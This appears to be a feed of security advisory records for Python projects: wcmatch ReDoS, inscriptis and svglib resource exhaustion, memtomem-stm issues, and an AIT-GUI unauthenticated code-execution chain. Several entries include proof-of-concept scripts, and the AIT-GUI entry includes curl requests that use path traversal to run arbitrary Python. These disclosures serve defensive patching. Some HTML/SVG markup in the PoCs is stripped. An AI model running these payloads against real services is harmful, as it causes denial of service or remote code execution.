items.title: [wcmatch] wcmatch: Polynomial-time ReDoS when matching untrusted names against multi-star patterns (default flags)
items.summary: SummaryWith default flags, a pattern that contains several * wildcards takes polynomial time, O(n^k) for k stars, to reject a crafted file name. The pattern is an ordinary developer constant such as *_*_*_*_*.csv; only the string being matched comes from the attacker. A 255-byte file name (the maximum on common filesystems) takes 73 s with fnmatch.fnmatch() and 86 s with glob.globmatch(). The standard library's fnmatch handles the same input in under a millisecond.This is different from GHSA-84v8-qmgq-9g88: that advisory covers extglob patterns, while this case needs no flags and no attacker-controlled pattern.DetailsEvery * is translated to a lazy .*? (_STAR, wcmatch/_wcparse.py:212; _PATH_STAR [^/]*?, :218), which is emitted in _handle_star (:1405-1424):*_*_*_*_*.csv  ->  ^(?s:(?=.)(?![.]).*?_.*?_.*?_.*?_.*?\.csv)$When the subject consists of many _ and does not end in .csv, the regex engine tries every way of splitting it between the stars. CPython fixed the same problem in its own fnmatch (bpo-40480) by making every star segment except the last one atomic.PoCimport time, fnmatch as stdfrom wcmatch import fnmatch, globfor pat, n in [('*_*_*_*.csv', 255), ('*_*_*_*.csv', 400), ('*_*_*_*_*.csv', 150),               ('*_*_*_*_*.csv', 200), ('*_*_*_*_*.csv', 255)]:    name = '_' * n    t = time.perf_counter(); fnmatch.fnmatch(name, pat); w = time.perf_counter() - t    t = time.perf_counter(); std.fnmatchcase(name, pat); s = time.perf_counter() - t    print(f'{pat:15} len={n}  wcmatch={w:.3f}s  stdlib={s:.5f}s')t = time.perf_counter(); glob.globmatch('uploads/' + '_' * 255, 'uploads/*_*_*_*_*.csv')print(f'globmatch {time.perf_counter() - t:.2f}s')wcmatch 11.1, CPython 3.13, macOS:*_*_*_*.csv     len=255  wcmatch=1.412s   stdlib=0.00001s*_*_*_*.csv     len=400  wcmatch=8.599s   stdlib=0.00004s*_*_*_*_*.csv   len=150  wcmatch=5.333s   stdlib=0.00003s*_*_*_*_*.csv   len=200  wcmatch=22.415s  stdlib=0.00007s*_*_*_*_*.csv   len=255  wcmatch=72.732s  stdlib=0.00047sglobmatch 85.75sglob.glob('*_*_*_*.csv', root_dir=d) on a real directory that contains one file named '_' * 255 takes 1.7 s.ImpactApplications that match untrusted names against multi-star patterns can be blocked on a single CPU core for minutes per name. Examples: upload handlers, archive or object-store key filters, and glob/WcMatch scans of directories where other users can create files. No authentication is needed.FixEmit every star segment except the last one as an atomic group, as the standard library does. On Python 3.11 and later use (?>.*?_); on 3.10 use the lookahead/backreference form from fnmatch._join_translated_parts. For example:^(?s:(?=.)(?![.])(?>.*?_)(?>.*?_)(?>.*?_)(?>.*?_).*?\.csv)$This rejects the 255-byte name in under 1 ms. On my spot-check inputs it gives the same results as the current regex. The same change applies to _PATH_STAR.Referenceshttps://github.com/facelessuser/wcmatch/security/advisories/GHSA-53pm-wgxf-c6qfhttps://nvd.nist.gov/vuln/detail/CVE-2026-132276https://github.com/facelessuser/wcmatch/commit/83491aadde57780330f993620083e979f645c80chttps://github.com/facelessuser/wcmatch/releases/tag/11.2https://github.com/advisories/GHSA-53pm-wgxf-c6qf

items.title: [inscriptis] Inscriptis: Quadratic memory growth from sibling <table> elements in get_text()
items.summary:
SummaryEvery sibling adds another level of the parent's indentation, so the size of get_text() output grows quadratically with the number of tables. In the measurements below, a 240 KB HTML document produces about 1 billion characters and uses about 1 GB of memory.Detailstable_end_handler() (model/tag/table_tag.py) writes the rendered table into the parent element with HtmlElement.write_verbatim_text() (model/html_element.py). For a block-level parent, write_verbatim_text() calls canvas.open_block(), which pushes the parent's padding_inline onto the prefix stack. The following close_block() never pops it; only Canvas.close_tag() calls prefix.remove_last_prefix(). So each table leaves one extra padding entry on the stack.This has been present since 2.0 (commit 84ec720).>>> get_text('
    ' + '
a
' * 4 + '')' a a a a 'PoCimport sys, time, resourcefrom inscriptis import get_textn = int(sys.argv[1])html = "
    " + "
    " * n + "
"t = time.time(); out = get_text(html)print(len(html), f"{time.time()-t:.2f}s", len(out), resource.getrusage(resource.RUSAGE_SELF).ru_maxrss // 2**20, "MiB")inscriptis 2.7.5, Python 3.11, macOS (2.0.0 behaves the same):tablesHTMLtimeoutput charspeak RSS1,00015 KB0.02 s4.0 M31 MiB4,00060 KB0.33 s64 M154 MiB8,000120 KB1.31 s256 M463 MiB16,000240 KB5.63 s1,024 M991 MiBWhen the input doubles, output size and memory grow about 4 times.ImpactAny application that converts untrusted HTML with inscriptis can be made to exhaust memory with a small document. This includes crawlers, RAG and LLM ingestion pipelines, and inscriptis-api. No authentication and no user interaction are needed.Fix self.canvas.write(self, text, whitespace=WhiteSpace.pre) if self.display == Display.block:+ self.canvas.current_block.prefix.remove_last_prefix() self.canvas.close_block(self)With this change the 240 KB input above produces 288 K characters in 0.14 s with 27 MiB peak RSS. A single table renders exactly as before, and the existing test suite passes.Referenceshttps://github.com/weblyzard/inscriptis/security/advisories/GHSA-q87h-c5m7-659jhttps://nvd.nist.gov/vuln/detail/CVE-2026-132277https://github.com/weblyzard/inscriptis/commit/dc122894cd671a0227f8fdad60464acddaf40fc8https://github.com/weblyzard/inscriptis/releases/tag/2.7.6https://github.com/advisories/GHSA-q87h-c5m7-659j

items.title: [svglib] svglib: Exponential resource consumption via nested <use> references in svg2rlg
items.summary: Summarysvg2rlg() expands references without any limit on the total number of expansions. Only direct cycles are rejected (CircularRefError). A group containing N elements that point to another such group multiplies the work by N per nesting level, so an SVG of about 1.4 KB makes svglib clone and render over 100,000 nodes, taking tens of seconds of CPU time and hundreds of MiB of memory. Each additional level adds about 245 bytes to the document and multiplies time by ~10.This is the SVG variant of the XML "billion laughs" attack (the same class as librsvg CVE-2019-20446).DetailsSvgRenderer.renderUse() in src/svglib/svglib.py:try: item = self.xlink_href_target(node, group=group)except CircularRefError: node.parent.etree_element.remove(node.etree_element) return group...if len(node.getchildren()) == 0: # Append a copy of the referenced node as the child (if not # already done) node.append(copy.deepcopy(item))self.renderNode(list(node.iter_children())[-1], parent=group)The referenced node is deep-copied under the element and rendered. Any elements inside the copied subtree go through renderUse() again. xlink_href_target() raises CircularRefError only for a direct cycle, so a reference DAG with fan-out is expanded fully: fan ** levels renders.Payload shape (fan = 10, levels = 5):ImpactDenial of service (CPU and memory exhaustion) for any application that renders SVG from an untrusted source with svglib: thumbnail/preview generation, SVG-to-PDF conversion, report generation. Only the SVG document needs to be attacker-controlled; no non-default option is required.The same happens through xhtml2pdf, which depends on svglib to render SVG images. An HTML document containing passed to pisa.CreatePDF() triggers the expansion. HTML-to-PDF conversion of user-supplied content is a common use of xhtml2pdf in web applications.ReproductionMinimal local PoC, non-destructive:import io, timefrom svglib.svglib import svg2rlgdef make(levels, fan=10): parts = ['') return "".join(parts).encode()for levels in (3, 4, 5): data = make(levels) t = time.time() svg2rlg(io.BytesIO(data)) print(levels, len(data), f"{time.time() - t:.1f}s")Result on svglib 2.3.0 (commit 5d28646), Python 3.12, macOS:levelsSVG sizetimepeak RSS3919 B0.3 s42 MiB41164 B2.9 s83 MiB51409 B34 s469 MiBsvglib 1.5.1 from PyPI behaves the same (levels = 4: 2.8 s, 82 MiB).Through xhtml2pdf 0.2.23 with the same SVG embedded as a data: URI :levelsHTML sizetimepeak RSS41626 B6.9 s133 MiB51954 B78.7 s499 MiBSuggested fixCount expansions per document and stop expanding beyond a fixed limit:@@ src/svglib/svglib.py # A sentinel to identify a situation where a node reference a fragment not yet defined. DELAYED = object() +# Upper bound on the number of elements expanded while rendering one document.+# Nested references multiply (a few hundred bytes can expand to millions of+# nodes), so rendering stops expanding elements beyond this limit.+MAX_USE_EXPANSIONS = 10_000+@@ class SvgRenderer: self._external_svgs: dict[str, ExternalSVG] = {}+ self._use_expansions = 0 self.attrConverter.css_rules = CSSMatcher()@@ def renderUse( if group is None: group = Group() + self._use_expansions += 1+ if self._use_expansions > MAX_USE_EXPANSIONS:+ if self._use_expansions == MAX_USE_EXPANSIONS + 1:+ logger.error(+ "Too many expansions (limit is %d), skipping the rest",+ MAX_USE_EXPANSIONS,+ )+ return group+ try: item = self.xlink_href_target(node, group=group)With the fix, a 6-level payload (1654 B, one million expansions without the limit) renders in 1.1 s with 64 MiB peak RSS. The limit value is a suggestion; 10,000 elements is far above what normal documents (icon sprites, symbol libraries) need.Regression testA regression test TestUseNode::test_use_nested_expansion_is_bounded in tests/test_basic.py renders the 5-level payload and asserts it finishes within 10 seconds.Without fix: test fails (30.9 s).With fix: test passes (1.8 s).python -m pytest tests/test_basic

items.title: [memtomem-stm] memtomem-stm: Concurrent LTM recovery can duplicate reconnects or reuse a cancelled transport session
items.summary: Concurrent surfacing RPC failures can trigger more than one reconnect for the same dirty session, and cancellation during a post-reconnect retry can leave the replacement session reusable despite an interrupted protocol exchange. The private fix introduces monotonic session generations, one shielded shared reconnect flight per dirty generation, and generation-aware cancellation handling across search, access-count, and scratch RPCs. The duplicate-reconnect subcase was introduced in 0.1.24; cancellation recovery affects the broader listed range.Referenceshttps://github.com/memtomem/memtomem-stm/security/advisories/GHSA-72jh-722p-rqr3https://nvd.nist.gov/vuln/detail/CVE-2026-77331https://github.com/memtomem/memtomem-stm/commit/761db1802df7ce4881ff4c3acee6d674925da498https://github.com/memtomem/memtomem-stm/releases/tag/v0.1.34https://github.com/advisories/GHSA-72jh-722p-rqr3

items.title: [memtomem-stm] memtomem-stm: Surfaced memory data can escape the Markdown compatibility boundary
items.summary: Untrusted long-term and working-memory fields can introduce Markdown or HTML-compatible structure into the surfaced-memory envelope. A crafted memory may create misleading structural boundaries or visually conceal content. The private fix serializes every untrusted field as inert single-line data, validates copyable memory identifiers, and pins an explicit untrusted-data preamble. Ordinary natural-language persuasion remains a residual model-level risk.Referenceshttps://github.com/memtomem/memtomem-stm/security/advisories/GHSA-43hx-xm7w-3mhjhttps://nvd.nist.gov/vuln/detail/CVE-2026-77332https://github.com/memtomem/memtomem-stm/commit/3d50ba61cbfafba6db261e35c18eed0c3805b390https://github.com/memtomem/memtomem-stm/releases/tag/v0.1.34https://github.com/advisories/GHSA-43hx-xm7w-3mhj

items.title: [ait-gui] AIT-GUI route chain allows unauthenticated Python execution in server process
items.summary: SummaryA security issue exists where unauthenticated callers can instruct the AIT-GUI server to execute arbitrary Python scripts. The attack vector involves obtaining a session cookie through GET /, followed by a malicious POST /script/run request containing an absolute file path that bypasses the configured script directory restrictions.Patches2.5.1ImpactThis vulnerability allows unauthenticated remote code execution on the AIT-GUI server. Any attacker with network access can execute arbitrary Python code with daemon privileges.DetailsChain:POST /tlm/query writes the user-controlled fields value into fields_in.txt under the AIT-GUI static directory.If the supplied dataDir has no .pcap files, the route returns the expected 400 Bad Request before deleting that file.POST /script/run accepts scriptPath=../static/fields_in.txt.AIT-GUI reads that file and runs it as Python.Relevant code:ait/gui/__init__.py:930,935,942-944: /tlm/query writes fields to fields_in.txt.ait/gui/__init__.py:952-958,978: the no-PCAP error path aborts before cleanup.ait/gui/__init__.py:1130-1136: /script/run joins scriptPath with ScriptRoot and only checks that the path exists.ait/gui/__init__.py:1186-1191: the selected file is read and executed as Python.ait/gui/__init__.py:1105-1108: nearby /scripts/load/<name> has a path containment check, but /script/run does not.Fix InformationRestricted script execution paths and avoided using static temp files.PoCPOST /tlm/query writes the user-controlled fields value into fields_in.txt under the AIT-GUI static directory.If the supplied dataDir has no .pcap files, the route returns the expected 400 Bad Request before deleting that file.# Remove file to ensure nothing existsAIT-GUI % rm <path>/fields_in.txt# With server started, send POST request to /tlm/query endpointAIT-GUI % curl -X POST http://localhost:8080/tlm/query \  -d "dataDir=<path>" \       -d "timeField=time" \  -d "packet=CCSDS_HEADER" \  -d "fields=field1,field2,field3" \  -d "startTime=2026-07-01T00:00:00" \  -d "endTime=2026-07-10T00:00:00" \  -o query_out.csv  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100   925  100   782  100   143  34798   6363 --:--:-- --:--:-- --:--:-- 42045# AIT-server log verify that PCAP file cannot be found:2026-07-10T11:46:37.873 | ERROR    | Unable to locate PCAP files for query given data directory <path># Verify file is created and not cleaned upAIT-GUI % cat <path>/fields_in.txtfield1field2field3POST /script/run accepts scriptPath=../static/fields_in.txt.AIT-GUI reads that file and runs it as Python.# Generate session cookiecurl -c cookies.txt -v http://localhost:8080/ -o /dev/null# Execute example script which currently exists in configured scripts.directory in config.yaml(venv) AIT-GUI-ghsa-jrjx-9jjw-747m % cat config.yaml | grep script    script:        directory: ./scripts(venv) AIT-GUI-ghsa-jrjx-9jjw-747m % ls scriptsexample_script.py# Create exploit script "exploit.py" outside of configured location(venv) scripts % ls ../exploit.py ../exploit.py# Perform request to example_script.py. This script prints 'correct'(venv) AIT-GUI-ghsa-jrjx-9jjw-747m % curl -X POST http://localhost:8080/script/run -d "scriptPath=example_script.py" -b cookies.txt# Perform request to exploit.py, which exists outside of configured location. This script prints 'exploited'(venv) AIT-GUI-ghsa-jrjx-9jjw-747m % curl -X POST http://localhost:8080/script/run -d "scriptPath=../exploit.py" -b cookies.txt  # Verify in server logs that correct and exploit print2026-07-10T13:46:41.441 | INFO     | Starting broker...correct...exploitedAdditional NotesPython code execution in the AIT-GUI server process.The demo is localhost only (127.0.0.1) and proves the issue against AIT-GUI 2.5.0. The tested AIT-GUI source binds the web server to 0.0.0.0, so in a deployment where another host can reach the AIT-GUI HTTP port, this becomes code execution from that network position.No login credentials or privileged account were required in the tested flow. The PoC only used the normal sid cookie created by GET /. In my local demo, the payload ran as my normal user (uid=1000), not root.ait_gui_tlm_query_script_run_rce_live_server.pyait-gui-tlm-query-script-run-rce.patchhttps://github.com/user-attachments/assets/a188aaa3-783a-4bb0-ab9a-6541f939a26aReferenceshttps://github.com/NASA-AMMOS/AIT-GUI/security/advisories/GHSA-jrjx-9jjw-747mhttps://nvd.nist.gov/vuln/detail/CVE-2026-77309https://github.com/NASA-AMMOS/AIT-GUI/commit/beb8fc0813eded89f985d3eb9a73535dd327726dhttps://github.com/NASA-AMMOS/AIT-GUI/blob/2.5.1/CHANGELOG.mdhttps://github.com/NASA-AMMOS/AIT-GUI/releases/tag/2.5.1https://github.com/advisories/GHSA-jrjx-9jjw-747m
